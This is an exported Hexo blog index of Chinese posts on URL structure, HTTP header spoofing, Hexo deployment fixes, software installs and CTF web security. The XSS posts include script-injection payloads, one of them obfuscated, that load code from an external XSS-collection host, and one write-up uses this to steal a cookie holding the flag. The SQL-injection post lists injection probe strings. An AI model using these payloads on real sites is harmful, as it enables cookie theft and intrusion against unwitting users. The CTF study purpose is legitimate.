        <content type="html"><![CDATA[<h1 id="URI、URL、URN"><a href="#URI、URL、URN" class="headerlink" title="URI、URL、URN"></a>URI、URL、URN</h1><h2 id="URI"><a href="#URI" class="headerlink" title="URI"></a>URI</h2><p>URI(uniform resource identifier)，统一资源标识符，用来唯一的标识一个资源。<br>Web上可用的每种资源如HTML文档、图像、视频片段、程序等都是一个来URI来定位的<br>URI一般由三部组成：<br>①访问资源的命名机制<br>②存放资源的主机名<br>③资源自身的名称，由路径表示，着重强调于资源。</p><h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p>URL(uniform resource locator)，统一资源定位器，它是一种具体的URI，即URL可以用来标识一个资源，而且还指明了如何locate这个资源。</p><p>采用URL可以用一种统一的格式来描述各种信息资源，包括文件、服务器的地址和目录等。URL一般由三部组成：<br>①协议(或称为服务方式)<br>②存有该资源的主机IP地址(有时也包括端口号)<br>③主机资源的具体地址。如目录和文件名等</p><p>例如<code>https://s1gma0.github.io/category/CTF/index.php?boardID=5&amp;ID=24618&amp;page=1#anchor</code></p><p>一个完整的URL包括以下几个部分：<br>①<strong>协议</strong>：在internet中可以使用很多协议，http、https、file、mailto、ftp。该URL的使用的是”https“协议。</p><p>②<strong>域名</strong>：该URL的域名是s1gma0.github.io</p><p>③<strong>端口</strong>：跟在域名后面的是端口，域名和端口之间用”:“作为分隔符。端口不是一个URL必须要有的部分，如果省略端口，将采用默认端口。该URL省略了端口，采用了默认的端口。</p><p>④<strong>虚拟目录</strong>：在域名后的第一个”/“和最后一个”/“之间的部分是虚拟目录。虚拟目录也不是一个URL必须要有的部分。本URL的虚拟目录为/category/CTF/</p><p>⑤<strong>文件名</strong>：从域名后的最后一个“/”开始到“？”为止，是文件名部分，如果没有“?”,则是从域名后的最后一个“/”开始到“#”为止，是文件部分，如果没有“？”和“#”，那么从域名后的最后一个“/”开始到结束，都是文件名部分。本例中的文件名是“index.php”。文件名部分也不是一个URL必须的部分，如果省略该部分，则使用默认的文件名.</p><p>⑥<strong>锚</strong>：从“#”开始到最后，都是锚部分。该URL中的锚是“anchor”。锚部分也不是一个URL必须的部分</p><p>⑦<strong>参数</strong>：从“？”开始到“#”为止之间的部分为参数部分，又称搜索部分、查询部分。该URL中的参数部分为“boardID=5&amp;ID=24618&amp;page=1”。参数可以允许有多个参数，参数与参数之间用“&amp;”作为分隔符。</p><h2 id="URN"><a href="#URN" class="headerlink" title="URN"></a>URN</h2><p>URN(uniform resource name)，统一资源命名，是通过名字来标识资源。</p><h2 id="三者的区别"><a href="#三者的区别" class="headerlink" title="三者的区别"></a>三者的区别</h2><p>URI是以一种抽象的，高层次概念定义统一资源标识，而URL和URN则是具体的资源标识的方式。URL和URN都是一种URI。笼统地说，每个URL都是URI，但不一定每个 URI 都是 URL。这是因为 URI 还包括一个子类，即统一资源名称 (URN)，它命名资源但不指定如何定位资源。上面的 mailto、news 和 isbn URI都是 URN 的示例。</p><h1 id="URL常见协议"><a href="#URL常见协议" class="headerlink" title="URL常见协议"></a>URL常见协议</h1><p>http：超文本传输协议。</p><p>https：超文本传输安全协议。<br>file：本地文件传输协议，主要用于访问本地计算机中的文件。</p><p>mailto：一种电子邮件协议，主要用于发送邮件。</p><p>ftp：文本传输协议，主要用于在网络上进行文件传输。</p><h1 id="HTTP头注入（待补充）"><a href="#HTTP头注入（待补充）" class="headerlink" title="HTTP头注入（待补充）"></a>HTTP头注入（待补充）</h1><h2 id="X-Forwarded-For"><a href="#X-Forwarded-For" class="headerlink" title="X-Forwarded-For"></a>X-Forwarded-For</h2><p>X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端<strong>最原始的IP地址</strong>的HTTP请求头字段。（维基百科）</p><p>简单地说，xff是告诉服务器当前请求者的最终ip的http请求头字段，通常可以直接通过修改http头中的X-Forwarded-For字段来仿造请求的最终ip。</p><p>X-Forwarded-For(XFF)，代表了HTTP的请求端真实的IP。通常一些网站的防注入功能会记录请求端真实IP地址并写入数据库。</p><p><code>X-Forwarded-For: 123.456.789.123</code></p><h2 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h2><p>HTTP来源地址（referer，或HTTPreferer），是HTTP表头的一个字段，用来表示从哪儿链接到当前的网页，采用的格式是URL。换句话说，借着HTTP来源地址，当前的网页可以检查访客从哪里而来，这也常被用来对付伪造的跨网站请求。（维基百科）</p><p>referer告诉服务器当前访问者是从哪个url地址跳转到自己的。它和xff一样，可直接修改。</p><p><code>Referer: https://www.baidu.com</code></p><h1 id="C语言"><a href="#C语言" class="headerlink" title="C语言"></a>C语言</h1><h2 id="矩阵的鞍点"><a href="#矩阵的鞍点" class="headerlink" title="矩阵的鞍点"></a>矩阵的鞍点</h2><p>在矩阵中，一个数在所在行中是最大值，在所在列中是最小值，则被称为鞍点。</p><p>例如矩阵a</p><p>1    2   3   4    5</p><p>5    6   7   8    9</p><p>10 11 12 13 14</p><p>该矩阵的鞍点为5.</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSSplatform</title>
      <link href="/2021/12/05/XSSplatform/"/>
      <url>/2021/12/05/XSSplatform/</url>
      
        <content type="html"><![CDATA[<p>将如下代码植入怀疑出现xss的地方（注意’的转义），即可在 项目内容 观看XSS效果</p><p><code>&lt;/textarea&gt;&#39;&quot;&gt;&lt;script src=http://xsscom.com//a0zR72&gt;&lt;/script&gt;</code></p><p>或者</p><p><code>&lt;/textarea&gt;&#39;&quot;&gt;&lt;img src=# id=xssyou style=display:none onerror=eval(unescape(/var%20b%3Ddocument.createElement%28%22script%22%29%3Bb.src%3D%22http%3A%2F%2Fxsscom.com%2F%2Fa0zR72%22%3B%28document.getElementsByTagName%28%22HEAD%22%29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b%29%3B/.source));//&gt;</code></p><p>再或者以你任何想要的方式插入</p><p><code>http://xsscom.com//a0zR72</code></p><p>再或者以你任何想要的方式插入</p><p><code>&lt;script src=&gt;&lt;/script&gt;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反射型XSS</title>
      <link href="/2021/12/05/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/"/>
      <url>/2021/12/05/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/</url>
      
        <content type="html"><![CDATA[<h1 id="一、寻找漏洞"><a href="#一、寻找漏洞" class="headerlink" title="一、寻找漏洞"></a>一、寻找漏洞</h1><p>在搜索框中随意输入字符，发现输入的字符直接出现在界面上。<br>然后输入特殊字符进行尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">//括号里的1可以为任意字符，将显示在弹窗界面上</span><br></pre></td></tr></table></figure><p>出现了弹窗，表明网页没有对用户的输入进行处理，直接输出到界面上。<br>XSS漏洞出现。</p><h1 id="二、实施攻击"><a href="#二、实施攻击" class="headerlink" title="二、实施攻击"></a>二、实施攻击</h1><p>在第一个搜索框中输入下面构造的payload，并点击submit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;/textarea&gt;&#x27;&quot;&gt;&lt;script src=http://xsscom.com//a0zR72&gt;&lt;/script&gt;</span><br><span class="line">//这个payload将执行http://xsscom.com//a0zR72下的项目代码</span><br></pre></td></tr></table></figure><p>然后在网页源代码中查找到这个payload是完整的，同时submit点击之后，URL发生改变。</p><p>将改变后的URL在第二个搜索框中输入并send</p><p>此时XSS platform收到了报文，在cookies中发现了flag</p><p><code>cookie : flag=ctfhub&#123;3efc235465db70e45070d143&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> XSS </tag>
            
            <tag> WriteUp </tag>
            
            <tag> CTFHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo部署时Error: Spawn failed的解决办法</title>
      <link href="/2021/12/02/Hexo%E9%83%A8%E7%BD%B2%E6%97%B6Error-Spawn-failed%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
      <url>/2021/12/02/Hexo%E9%83%A8%E7%BD%B2%E6%97%B6Error-Spawn-failed%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p><strong>目前，有三种解决方法。主要有两种合适的解决办法,</strong></p><h1 id="一、git-repo配置地址不正确"><a href="#一、git-repo配置地址不正确" class="headerlink" title="一、git repo配置地址不正确"></a>一、git repo配置地址不正确</h1><p><strong>我目前所遇到的问题都是这个方法解决的，去GitHub上的仓库里重新复制HTTPS，更改一下repo。</strong></p><p>下面是将http方式改为ssh</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##进入站点根目录</span></span><br><span class="line"><span class="string">cd</span> <span class="string">/usr/local/src/hexo/hanyubolg/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##删除git提交内容文件夹</span></span><br><span class="line"><span class="string">vim</span> <span class="string">_config.yml</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##修改</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">git</span></span><br><span class="line"><span class="attr">repo:</span> <span class="string">https://github.com/yourname/yourname.github.io.git</span> <span class="string">-&gt;</span> <span class="string">git@github.com:a956551943/weixiaohui.github.io.git</span></span><br><span class="line"><span class="attr">branch:</span> <span class="string">main</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##最后</span></span><br><span class="line"><span class="string">hexo</span> <span class="string">clean</span> <span class="string">&amp;&amp;</span> <span class="string">hexo</span> <span class="string">g</span> <span class="string">&amp;&amp;</span> <span class="string">hexo</span> <span class="string">d</span></span><br></pre></td></tr></table></figure><h2 id="二、删除git提交内容，然后更改换行符自动转换的设置"><a href="#二、删除git提交内容，然后更改换行符自动转换的设置" class="headerlink" title="二、删除git提交内容，然后更改换行符自动转换的设置"></a>二、删除git提交内容，然后更改换行符自动转换的设置</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##进入站点根目录</span></span><br><span class="line"><span class="string">cd</span> <span class="string">/usr/local/src/hexo/hanyubolg/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##删除git提交内容文件夹</span></span><br><span class="line"><span class="string">rm</span> <span class="string">-rf</span> <span class="string">.deploy_git/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##执行</span></span><br><span class="line"><span class="string">git</span> <span class="string">config</span> <span class="string">--global</span> <span class="string">core.autocrlf</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##最后</span></span><br><span class="line"><span class="string">hexo</span> <span class="string">clean</span> <span class="string">&amp;&amp;</span> <span class="string">hexo</span> <span class="string">g</span> <span class="string">&amp;&amp;</span> <span class="string">hexo</span> <span class="string">d</span></span><br></pre></td></tr></table></figure><h3 id="三、强制推送（不推荐）"><a href="#三、强制推送（不推荐）" class="headerlink" title="三、强制推送（不推荐）"></a>三、强制推送（不推荐）</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##进入站点根目录</span></span><br><span class="line"><span class="string">cd</span> <span class="string">/usr/local/src/hexo/hanyubolg/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##进入depoly文件夹</span></span><br><span class="line"><span class="string">cd</span> <span class="string">.deploy_git/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##强制推送</span></span><br><span class="line"><span class="string">git</span> <span class="string">push</span> <span class="string">-f</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> error </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2021/12/02/SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2021/12/02/SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="一、判断有无注入点"><a href="#一、判断有无注入点" class="headerlink" title="一、判断有无注入点"></a>一、判断有无注入点</h1><h2 id="1-加入单引号’提交"><a href="#1-加入单引号’提交" class="headerlink" title="1.加入单引号’提交"></a>1.加入单引号’提交</h2><p>结果：如果出现错误提示，则该网站就可能存在注入漏洞。</p><h2 id="2-数字型判断是否有注入"><a href="#2-数字型判断是否有注入" class="headerlink" title="2.数字型判断是否有注入"></a>2.数字型判断是否有注入</h2><h3 id="①语句：-and-1-1-and-1-2（经典）-‘and’1’-1-字符型"><a href="#①语句：-and-1-1-and-1-2（经典）-‘and’1’-1-字符型" class="headerlink" title="①语句：   and 1=1    and 1=2（经典）       ‘and’1’=1(字符型)"></a>①语句：   and 1=1    and 1=2（经典）       ‘and’1’=1(字符型)</h3><p>结果：分别返回不同的页面，说明存在注入漏洞</p><p>分析：and 的意思是“和”如果没有过滤我们的语句，and 1=1就会被代入SQL查询语句进行查询，<br>如果and前后的两条语句都是真的话就不会出错，但如果前后语句有一个为假的话，程序就会暴错。<br>也就表明程序有注入漏洞</p><h3 id="②语句：or-2-gt-1-or-1-gt-2"><a href="#②语句：or-2-gt-1-or-1-gt-2" class="headerlink" title="②语句：or 2&gt;1    or 1&gt;2"></a>②语句：or 2&gt;1    or 1&gt;2</h3><p>结果：分别返回不同的页面，说明存在注入漏洞</p><p>分析：or注入只要求前后两个语句只要有一个正确就为真，如果前后两个语句都是正确的，反而为假。（or注入时，or后面的语句如果是正确的，则返回错误页面！如果是错误，则返回正确页面，说明存在注入点。）</p><h3 id="③语句：xor-1-1-xor-1-2"><a href="#③语句：xor-1-1-xor-1-2" class="headerlink" title="③语句：xor 1=1      xor 1=2"></a>③语句：xor 1=1      xor 1=2</h3><p>结果:分别返回不同的页面,说明存在注入漏洞.<br>分析:xor 代表着异或,意思即连接的表达式仅有一个为真的时候才为真。<br>(xor注入时，xor后面的语句如果是正确的，则返回错误页面积，如果是错误，则返回正确<br>页面，说明存在注入点)</p><h3 id="④把and-1-1转换成URL编码形式后再提交"><a href="#④把and-1-1转换成URL编码形式后再提交" class="headerlink" title="④把and 1=1转换成URL编码形式后再提交"></a>④把and 1=1转换成URL编码形式后再提交</h3><p>语句：%41%4E%44%20%%31%3D%31</p><h3 id="⑤使用-1-0"><a href="#⑤使用-1-0" class="headerlink" title="⑤使用-1,-0"></a>⑤使用-1,-0</h3><p>分析：如果返回的页面和前面不同，是另一则新闻，则表示有注入漏洞，是数字型的注入漏洞;在URL地址后面加上 -0，URL变成 news.asp?id=123-0，返回的页面和前面的页面相同，加上-1，返回错误页面，则也表示存在注入漏洞.</p><h2 id="3-字符型判断是否有注入"><a href="#3-字符型判断是否有注入" class="headerlink" title="3.字符型判断是否有注入"></a>3.字符型判断是否有注入</h2><h3 id="语句：’and’1-1-‘and’1-2-经典"><a href="#语句：’and’1-1-‘and’1-2-经典" class="headerlink" title="语句：’and’1=1          ‘and’1=2(经典)"></a>语句：’and’1=1          ‘and’1=2(经典)</h3><p> 结果：结果:分别返回不同的页面,说明存在注入漏洞<br> 分析：加入’ and ‘1’=1返回正确页面，加入’ and ‘1=2返回错误页面，说明有注入漏同。</p><h2 id="4-搜索型判断是否有注入"><a href="#4-搜索型判断是否有注入" class="headerlink" title="4.搜索型判断是否有注入"></a>4.搜索型判断是否有注入</h2><p>简单的判断搜索型注入漏洞存在不存在的办法是先搜索’，如果出错，说明90%存在这个漏洞。然后搜<br>索%，如果正常返回，说明95%有洞了。**<br>说明：加入如”&amp;;”、”[“、”]”、”%”、”$”、”@”等特殊字符，都可以实现，如果出现错误，说明有问题<br>操作：<br>搜索一个关键字，比如2006吧，正常返回所有2006相关的信息，再搜索2006%’and 1=1 and ‘%’=’和<br>2006%’and 1=2 and ‘%’=’，存在异同的话，就是100%有洞了。<br>关键字%’ and 1=1 and ‘%’=’%<br>关键字%’ and 1=2 and ‘%’=’%<br>将and 1=1 换成注入语句就可以了</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jade6安装及PDF导入（SUCCESS）</title>
      <link href="/2021/11/25/jade6%E5%AE%89%E8%A3%85%E5%8F%8APDF%E5%AF%BC%E5%85%A5/"/>
      <url>/2021/11/25/jade6%E5%AE%89%E8%A3%85%E5%8F%8APDF%E5%AF%BC%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h1><p>注意更改安装路径，其余直接下一步，至安装结束。</p><h1 id="二、注册XOC组件"><a href="#二、注册XOC组件" class="headerlink" title="二、注册XOC组件"></a>二、注册XOC组件</h1><p>组件名称</p><p>comdlg32.ocx</p><p>MSCOMCT2.OCX</p><p>MSCOMCTL.OCX</p><p>THREED32.OCX</p><p>将几个组件和批处理文件移动到C:\Windows\SysWOW64中，以管理员身份运行批处理文件。</p><h1 id="三、导入PDF卡片"><a href="#三、导入PDF卡片" class="headerlink" title="三、导入PDF卡片"></a>三、导入PDF卡片</h1><p>打开软件，到PDF选项然后点击Set up，点击第一行最右边的手指，选择pdf2.dat文件，然后</p><p>点击select all，接着点击create，等待create结束。</p><h1 id="PS"><a href="#PS" class="headerlink" title="PS:"></a>PS:</h1><p>Onedrive上有下载程序以及组件的压缩包。</p>]]></content>
      
      
      <categories>
          
          <category> nothing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jade 6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jade安装（注册表导入失败）无法使用</title>
      <link href="/2021/11/25/jade6%E5%AE%89%E8%A3%85%E6%96%B9%E6%B3%95_fail/"/>
      <url>/2021/11/25/jade6%E5%AE%89%E8%A3%85%E6%96%B9%E6%B3%95_fail/</url>
      
        <content type="html"><![CDATA[<h1 id="Jade-6安装方法"><a href="#Jade-6安装方法" class="headerlink" title="Jade 6安装方法"></a>Jade 6安装方法</h1><h2 id="更改兼容性"><a href="#更改兼容性" class="headerlink" title="更改兼容性"></a>更改兼容性</h2><p>点击exe先进行下载，然后找到jade6.exe将兼容性改为Windows 7。</p><h2 id="安装缺失控件"><a href="#安装缺失控件" class="headerlink" title="安装缺失控件"></a>安装缺失控件</h2><p>comdlg32.ocx</p><p>MSCOMCT2.OCX</p><p>MSCOMCTL.OCX</p><p>THREED32.OCX</p><p>将这几个控件和批处理程序移动到*<em>C:\Windows\SysWOW64*</em></p><p>然后运行一下批处理程序，即可。</p><h2 id="PS："><a href="#PS：" class="headerlink" title="PS："></a>PS：</h2><p>文件在Onedrive上有备份。</p><p>安装后由于注册表导入的用户名一直出错，导致pdf卡片无法导入，放弃该版本下载，改用其他下载。</p>]]></content>
      
      
      <categories>
          
          <category> nothing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jade 6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>First time to use this!</title>
      <link href="/2021/11/22/first-to/"/>
      <url>/2021/11/22/first-to/</url>
      
        <content type="html"><![CDATA[<h1 id="First-time-to-use-this"><a href="#First-time-to-use-this" class="headerlink" title="First time to use this!"></a>First time to use this!</h1><h2 id="一、上传文档操作步骤："><a href="#一、上传文档操作步骤：" class="headerlink" title="一、上传文档操作步骤："></a>一、上传文档操作步骤：</h2><p>首先把文件放在source里边，然后在Blog目录中打开Git Bush,然后依次执行下列操作。</p><p>清除：hexo clean</p><p>生成：hexo generate</p><p>上传：hexo deploy</p><p>PS：</p><p>上传完之后，在线网页用control+F5强制刷新一下；也可使用hexo s 打开离线网页</p><h2 id="二、创建新文档"><a href="#二、创建新文档" class="headerlink" title="二、创建新文档"></a>二、创建新文档</h2><p>hexo new “title”        </p><p>创建的文档应该默认是md文档</p><h2 id="三、命令行的使用"><a href="#三、命令行的使用" class="headerlink" title="三、命令行的使用"></a>三、命令行的使用</h2><p>ls列出当前所在目录，cd打开目录，运行程序是可以直接输入该文件的名称。</p><p>control+home，control+end分别将光标移动到最左边，最右边。</p><p>鼠标右键直接粘贴。</p>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
